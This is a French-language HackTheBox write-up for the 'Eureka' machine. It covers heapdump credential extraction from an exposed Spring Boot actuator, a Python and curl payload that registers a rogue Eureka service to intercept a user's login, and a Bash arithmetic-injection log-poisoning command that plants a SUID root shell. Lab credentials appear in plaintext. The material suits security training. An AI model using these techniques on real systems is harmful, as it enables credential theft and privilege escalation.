---
title: Eureka
date: 2025-12-11 13:49:31
categories: ["Machines", "Hackthebox"]
tags: ["Hard", "Linux", "SSRF", "Log Poisoning", "Springboot Heapdump"]
image: eureka.png
comments: false
---

`Eureka` est une machine Linux de difficulté Hard qui commence avec un site web **Spring Boot**. J'exploite un point de terminaison `heapdump` exposé pour récupérer les identifiants de la mémoire et l'accès SSH. Ensuite, j'empoisonne la configuration de Spring Cloud Gateway pour récupérer les identifiants de connexion d'un autre utilisateur. Pour obtenir l'accès root, j'exploite une injection arithmétique Bash pour obtenir l'exécution d'un script analysant les journaux sur un cron.


# Énumération
## Nmap

Le scan Nmap révèle 3 ports ouverts :
- 22 pour le SSH
- 80 pour le HTTP
- 8761 pour un serveur `Spring Eureka`

```shell
nmap 10.10.11.66 --min-rate 1000 -vv -sC -sV -p-
```

```shell
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d6b2104232354dc9aebd3f1f5865ce49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpa5HH8lfpsh11cCkEoqcNXWPj6wh8GaDrnXst/q7zd1PlBzzwnhzez+7mhwfv1PuPf5fZ7KtZLMfVPuUzkUHVEwF0gSN0GrFcKl/D34HmZPZAsSpsWzgrE2sayZa3xZuXKgrm5O4wyY+LHNPuHDUo0aUqZp/f7SBPqdwDdBVtcE8ME/AyTeJiJrOhgQWEYxSiHMzsm3zX40ehWg2vNjFHDRZWCj3kJQi0c6Eh0T+hnuuK8A3Aq2Ik+L2aITjTy0fNqd9ry7i6JMumO6HjnSrvxAicyjmFUJPdw1QNOXm+m+p37fQ+6mClAh15juBhzXWUYU22q2q9O/Dc/SAqlIjn1lLbhpZNengZWpJiwwIxXyDGeJU7VyNCIIYU8J07BtoE4fELI26T8u2BzMEJI5uK3UToWKsriimSYUeKA6xczMV+rBRhdbGe39LI5AKXmVM1NELtqIyt7ktmTOkRQ024ZoSS/c+ulR4Ci7DIiZEyM2uhVfe0Ah7KnhiyxdMSlb0=
|   256 90119d67b6f664d4df7fed4a902e6d7b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNqI0DxtJG3vy9f8AZM8MAmyCh1aCSACD/EKI7solsSlJ937k5Z4QregepNPXHjE+w6d8OkSInNehxtHYIR5nKk=
|   256 9437d342955dadf77973a6379445ad47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHNmmTon1qbQUXQdI6Ov49enFe6SgC40ECUXhF0agNVn
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
8761/tcp open  unknown syn-ack ttl 63
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 401
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
```


J'ajoute le nom de domaine dans le fichier `/etc/hosts`.
```shell
echo "10.10.11.66 furni.htb" | tee -a /etc/hosts
```


## HTTP - TCP 80
### Gobuster

Je trouve beaucoup de répertoires dont ce `actuator` qui m'intrigue assez. J'ai aussi remarqué que très peu de wordlists de `seclists` avait ce mot.
```shell
[root@exegol-htb] /workspace/Eureka
❯ dirsearch -u http://furni.htb -t 50 -x 400,500

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 50 | Wordlist size: 12289

Target: http://furni.htb/

[18:06:35] Scanning:
[18:06:43] 200 -   14KB - /about
[18:06:43] 200 -    2KB - /actuator
[18:06:43] 200 -    20B - /actuator/caches
[18:06:43] 200 -    6KB - /actuator/env
[18:06:43] 200 -     2B - /actuator/info
[18:06:43] 200 -    54B - /actuator/scheduledtasks
[18:06:43] 200 -   467B - /actuator/features
[18:06:43] 200 -    15B - /actuator/health
[18:06:43] 200 -    3KB - /actuator/metrics
[18:06:43] 405 -   114B - /actuator/refresh
[18:06:43] 200 -   35KB - /actuator/mappings
[18:06:43] 200 -   36KB - /actuator/configprops
[18:06:43] 200 -   99KB - /actuator/loggers
[18:06:43] 200 -  180KB - /actuator/conditions
[18:06:43] 200 -  198KB - /actuator/beans
[18:06:43] 200 -  180KB - /actuator/threaddump
[18:06:43] 200 -   76MB - /actuator/heapdump
[18:06:53] 200 -   13KB - /blog
[18:06:53] 302 -     0B - /cart  ->  http://furni.htb/login
[18:06:55] 302 -     0B - /checkout  ->  http://furni.htb/login
[18:06:56] 302 -     0B - /comment  ->  http://furni.htb/login
[18:06:59] 200 -   10KB - /contact
[18:07:11] 404 -   564B - /favicon.ico
[18:07:27] 200 -    2KB - /login
[18:07:28] 200 -    1KB - /logout
[18:07:50] 200 -    9KB - /register
[18:07:55] 200 -   14KB - /services
[18:07:56] 200 -   12KB - /shop
[18:08:00] 404 -   564B - /static/api/swagger.json
[18:08:00] 404 -   564B - /static/api/swagger.yaml
[18:08:00] 404 -   564B - /static/dump.sql
```


### Vhost Fuzzing

Je n'ai trouvé aucun sous-domaine.
```shell
gobuster vhost -u http://furni.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t 40
```
![](Eureka-8.png)


### Site

J'arrive sur un site qui semble être une boutique en ligne de meubles de salons.
![](Eureka-1.png)

Potentiels utilisateurs sur  la page `About Us`.
![](Eureka-2.png)

Il y a une page de connexion.
![](Eureka-3.png)

Je crée un compte sur le `/register`
![](Eureka-4.png)

Je me connecte ensuite sur le `/login`.
![](Eureka-6.png)

Sur la page `blog`, je peux laisser un commentaire sur un article. Ce commentaire s'affiche juste après l'avoir envoyé. Mais je n'ai rien pu exploiter avec cette fonctionnalité.
![](Eureka-7.png)


## Eureka - TCP 8761

Lorsque je me rends sur le port 8761, on me demande des identifiants. Jusque là, je n'en ai pas donc je reviendrai plus tard sur ce port.
![](Eureka-9.png)


# Shell as oscar190
## Sringboot Heapdump

En me rendant dans le répertoire `actuator`, j'ai du JSON contenant beaucoup de liens.
![](Eureka-11.png)

En me rendant sur le lien vers le `heapdump`, cela télécharge un fichier.
![](Eureka-12.png)

Je vois qu'il s'agit d'un fichier `Java HPROF dump`.
![](Eureka-17.png)

Avec ce document trouvé sur [ExploitDB](https://www.exploit-db.com/docs/50459), je vois comment lire le contenu de ce type de fichier. Pour cela, j'utiliserai l'application [Java VisualVM](https://visualvm.github.io/download.html).
![](Eureka-18.png)

Après upload du fichier, je change l'option `summary` pour `0QL Console` dans laquelle je pourrai exécuter des requêtes `OQL`.
![](Eureka-13.png)

Avec la requête suivante j'affiche tous les objets de type chaîne de caractères.
```java
select heap.objects('java.lang.String')
```
![](Eureka-14.png)

```java
select s from java.lang.String s where s.toString().contains("key")
```
![](Eureka-15.png)

Je trouve des identifiants MySQL `oscar190:0sc@r190_S0l!dP@sswd` avec la requête suivante.
```java
select s from java.lang.String s where s.toString().contains("password")
```
![](Eureka-16.png)

Pour copier facilement le contenu, il suffit ce cliquer sur l'objet (`java.lang.Sting#566629`), cela ouvre une seconde fenêtre sur laquelle, je clique sur `Preview` pour mieux afficher le contenu. Je peux enfin copier le contenu.
![](Eureka-19.png)

Je trouve d'autres identifiants `EurekaSrvr:0scarPWDisTheB3st`, ceux du service `Eureka` sur le port 8761 avec la requête suivante.
```java
select s from java.lang.String s where s.toString().contains("8761")
```
![](Eureka-25.png)


## SSH

Les identifiants MySQL sont valides et permettant d'avoir un connexion SSH.
```shell
nxc ssh furni.htb -u oscar190 -p '0sc@r190_S0l!dP@sswd'
```
![](Eureka-20.png)

Je me connecte alors par SSH en tant que `oscar190`. Ce n'est pas cet utilisateur qui a le flag user.
```shell
ssh oscar190@furni.htb
```
![](Eureka-21.png)


# Shell as Miranda-Wise
## Tester les mots de passe

Je vois qu'il y a un autre utilisateur : `miranda-wise`.
![](Eureka-22.png)

Je teste alors sur elle, les deux mots de passe trouvés, mais aucun d'entre eux ne fonctionne.
![](Eureka-26.png)


## MySQL

En me connectant à la base de données MySQL, je trouve le hash de `miranda-wise`. Mais il ne me servira à rien puisque je n'ai pas réussi à le cracker.
```shell
mysql -u oscar190 -p'0sc@r190_S0l!dP@sswd'
```
![](Eureka-23.png)


## Eureka

J'essais alors de me connecter avec les identifiants `EurekaSrvr:0scarPWDisTheB3st` au service `Eureka`.
![](Eureka-28.png)

Un peu en bas de la page, je vois qu'il existe un répertoire `eureka` sur le localhost.
![](Eureka-29.png)

Donc je fais de la redirection de ports avec SSH.
```shell
ssh oscar190@furni.htb -L 8761:127.0.0.1:8761
```

Mais lorsque j'y accède, j'ai une erreur
![](Eureka-30.png)

Avec `dirsearch`, je ne trouve aucun endpoint après le répertoire `eureka`.
```shell
[root@exegol-htb] /workspace/Eureka
❯ dirsearch -u http://127.0.0.1:8761/eureka/ -t 50 -x 400,500

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 50 | Wordlist size: 12289

Target: http://127.0.0.1:8761/

[18:15:39] Scanning: eureka/

Task Completed
```


## SSRF

Je demande alors à ChatGPT quelques endpoints sur `Eureka`.
![](Eureka-31.png)

Je me rends alors sur ces endpoints et sur le `/apps`, je peux voir la listes des applications enregistrées.
![](Eureka-34.png)

En recherchant su google, `pentest netflix eureka`, je trouve cet article de [Backbase Engineering](https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka). Ce qu'il faut comprendre est que lorsque qu'une instance `Eureka` est accessible depuis internet, il est possible d'effectuer une `SSRF`.
Si `Eureka` est **exposé sur Internet** et qu’il **n’exige pas d’authentification** ou qu'un attaquant à accès aux identifiants (ce qui est notre cas ici), il peut s’y **enregistrer comme un faux service** en donnant comme adresse IP/Port… **n’importe quelle cible** que le service appelant peut joindre. Donc avec l'aide de ChatGPT, je crée un script python permettant d'exploiter cette vulnérabilité.
```python
import requests

EUREKA_URL = "http://{EurekaSrvr}:{Eureka_PASSWORD}@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE"
MY_IP = "xx.xx.xx.xx"
TARGET_PORT = 8081

json_payload = {
    "instance": {
        "instanceId": "USER-MANAGEMENT-SERVICE",
        "hostName": MY_IP,
        "app": "USER-MANAGEMENT-SERVICE",
        "ipAddr": MY_IP,
        "status": "UP",
        "port": {"$": TARGET_PORT, "@enabled": "true"},
        "vipAddress": "USER-MANAGEMENT-SERVICE",
        "secureVipAddress": "USER-MANAGEMENT-SERVICE",
        "countryId": 1,
        "dataCenterInfo": {
            "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
            "name": "MyOwn"
        }
    }
}


headers = {
    "Content-Type": "application/json"
}

response = requests.post(EUREKA_URL, json=json_payload, headers=headers)

if response.status_code == 204:
    print("[+] Malicious service successfully registered.")
else:
    print(f"[-] Failure ({response.status_code}) : {response.status_code} {response.text}")
```

J'ai aussi créé une variante en une seule commande `curl`.
```shell
curl -X POST \
  "http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE" \
  -H "Content-Type: application/json" \
  -d '{
    "instance": {
      "instanceId": "USER-MANAGEMENT-SERVICE",
      "hostName": "MY_IP",
      "app": "USER-MANAGEMENT-SERVICE",
      "ipAddr": "MY_IP",
      "status": "UP",
      "vipAddress": "USER-MANAGEMENT-SERVICE",
      "secureVipAddress": "USER-MANAGEMENT-SERVICE",
      "port": { "$": TARGET_PORT, "@enabled": "true" },
      "countryId": 1,
      "dataCenterInfo": {
        "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
        "name": "MyOwn"
      }
    }
  }'
```

Je lance alors un listener et quelques minutes plus tard, je reçois les identifiants de `miranda-wise`.
![](Eureka-35.png)

Je déchiffre le mot de passe sur [cyberchef](https://gchq.github.io/CyberChef/).
![](Eureka-36.png)


## SSH

J'obtiens un shell SSH en tant que `miranda-wise`.
```shell
ssh miranda-wise@furni.htb
```
![](Eureka-37.png)


# Shell en tant que root
## Log poisoning

Dans le répertoire `/opt` se trouve un fichier `log_analyse.sh` appartenant à l'utilisateur root.
![](Eureka-38.png)

Dans ce fichier, se trouve plusieurs fonctions dont la fonction `analyze_http_statuses` qui est vulnérable a une injection de code malveillant.
```sh
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi


analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}


analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}


analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}


display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))

        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi

        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}


# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"
```

![](Eureka-39.png)

J'ai confirmé que le fichier `/var/www/web/cloud-gateway/log/application.log` était réactualiser toutes les quelques secondes. Donc je pourrais tenter du `log poisonning`.
```shell
echo 'HTTP Status: x[$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)]' > application.log
```
![](Eureka-40.png)

Quelques secondes plus tard, le fichier est créé.
![](Eureka-41.png)

Je peux donc l’exécuter et obtenir un Shell en tant que root.
![](Eureka-42.png)

Merci d'avoir lu jusqu'ici.
![ThankYou](https://media.tenor.com/S3aD4J4DwCoAAAAi/baby-chick.gif)
